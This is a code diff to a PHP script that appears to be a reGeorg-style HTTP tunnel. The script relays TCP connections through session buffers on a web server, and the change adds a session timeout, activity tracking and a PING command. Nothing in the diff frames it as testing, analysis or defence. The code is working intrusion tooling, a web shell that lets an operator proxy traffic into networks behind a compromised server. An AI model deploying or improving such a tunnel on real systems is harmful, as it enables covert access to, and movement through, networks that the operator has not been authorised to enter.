@@ -53,6 +53,9 @@ $IP            = 6;
 $PORT          = 7;
 $REDIRECTURL   = 8;
 $FORCEREDIRECT = 9;
+$PING          = 10;
+
+$SESSION_TTL = 120;
 
 $en = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
 $de = "BASE64 CHARSLIST";
@@ -70,6 +73,7 @@ $cmd = $info[$CMD];
 $run = "run".$mark;
 $writebuf = "writebuf".$mark;
 $readbuf = "readbuf".$mark;
+$activekey = $mark . "_active";
 
 switch($cmd){
     case "CONNECT":
@@ -92,19 +96,31 @@ switch($cmd){
             $_SESSION[$run] = true;
             $_SESSION[$writebuf] = "";
             $_SESSION[$readbuf] = "";
+            $_SESSION[$activekey] = time();
             session_write_close();
 
-            while ($_SESSION[$run])
+            while (true)
             {
-                if (empty($_SESSION[$writebuf])) {
+                @session_start();
+                $running = isset($_SESSION[$run]) ? $_SESSION[$run] : false;
+                $lastActive = isset($_SESSION[$activekey]) ? $_SESSION[$activekey] : 0;
+                $writeBuff = isset($_SESSION[$writebuf]) ? $_SESSION[$writebuf] : "";
+                $_SESSION[$writebuf] = "";
+                if ($lastActive > 0 && (time() - $lastActive) > $SESSION_TTL) {
+                    $_SESSION[$run] = false;
+                    $running = false;
+                }
+                session_write_close();
+
+                if (!$running) {
+                    break;
+                }
+
+                if ($writeBuff === "") {
                     usleep(50000);
                 }
 
                 $readBuff = "";
-                @session_start();
-                $writeBuff = $_SESSION[$writebuf];
-                $_SESSION[$writebuf] = "";
-                session_write_close();
                 if ($writeBuff != "")
                 {
                     stream_set_blocking($res, false);
@@ -114,18 +130,11 @@ switch($cmd){
                         @session_start();
                         $_SESSION[$run] = false;
                         session_write_close();
-                        return;
+                        break;
                     }
                 }
                 stream_set_blocking($res, false);
                 while ($o = fgets($res, READBUF)) {
-                    if($o === false)
-                    {
-                        @session_start();
-                        $_SESSION[$run] = false;
-                        session_write_close();
-                        return;
-                    }
                     $readBuff .= $o;
                     if ( strlen($readBuff) > MAXREADSIZE ) {
                         break;
@@ -134,6 +143,7 @@ switch($cmd){
                 if ($readBuff != ""){
                     @session_start();
                     $_SESSION[$readbuf] .= $readBuff;
+                    $_SESSION[$activekey] = time();
                     session_write_close();
                 }
             }
@@ -147,19 +157,29 @@ switch($cmd){
             unset($_SESSION[$run]);
             unset($_SESSION[$readbuf]);
             unset($_SESSION[$writebuf]);
+            unset($_SESSION[$activekey]);
             session_write_close();
+            $rinfo[$STATUS] = 'OK';
         }
         break;
     case "READ":
         {
             @session_start();
-            $readBuffer = $_SESSION[$readbuf];
+            $readBuffer = isset($_SESSION[$readbuf]) ? $_SESSION[$readbuf] : "";
             $_SESSION[$readbuf]="";
-            $running = $_SESSION[$run];
+            $running = isset($_SESSION[$run]) ? $_SESSION[$run] : false;
+            $lastActive = isset($_SESSION[$activekey]) ? $_SESSION[$activekey] : 0;
+            if ($running && $lastActive > 0 && (time() - $lastActive) > $SESSION_TTL) {
+                $_SESSION[$run] = false;
+                $running = false;
+            }
             session_write_close();
             if ($running) {
                 $rinfo[$STATUS] = 'OK';
                 $rinfo[$DATA] = $readBuffer;
+                @session_start();
+                $_SESSION[$activekey] = time();
+                session_write_close();
                 header("Connection: Keep-Alive");
             } else {
                 $rinfo[$STATUS] = 'FAIL';
@@ -169,7 +189,12 @@ switch($cmd){
         break;
     case "FORWARD": {
             @session_start();
-            $running = $_SESSION[$run];
+            $running = isset($_SESSION[$run]) ? $_SESSION[$run] : false;
+            $lastActive = isset($_SESSION[$activekey]) ? $_SESSION[$activekey] : 0;
+            if ($running && $lastActive > 0 && (time() - $lastActive) > $SESSION_TTL) {
+                $_SESSION[$run] = false;
+                $running = false;
+            }
             session_write_close();
             if(!$running){
                 $rinfo[$STATUS] = 'FAIL';
@@ -180,6 +205,7 @@ switch($cmd){
             if ($rawPostData) {
                 @session_start();
                 $_SESSION[$writebuf] .= $rawPostData;
+                $_SESSION[$activekey] = time();
                 session_write_close();
                 $rinfo[$STATUS] = 'OK';
                 header("Connection: Keep-Alive");
@@ -187,6 +213,24 @@ switch($cmd){
                 $rinfo[$STATUS] = 'FAIL';
                 $rinfo[$ERROR] = 'POST data parse error';
             }
+        }
+        break;
+    case "PING": {
+            @session_start();
+            $running = isset($_SESSION[$run]) ? $_SESSION[$run] : false;
+            $lastActive = isset($_SESSION[$activekey]) ? $_SESSION[$activekey] : 0;
+            if ($running && $lastActive > 0 && (time() - $lastActive) > $SESSION_TTL) {
+                $_SESSION[$run] = false;
+                $running = false;
+            }
+            if ($running) {
+                $_SESSION[$activekey] = time();
+                $rinfo[$STATUS] = 'OK';
+            } else {
+                $rinfo[$STATUS] = 'FAIL';
+                $rinfo[$ERROR] = 'TCP session is closed';
+            }
+            session_write_close();
         }
         break;
     default: {
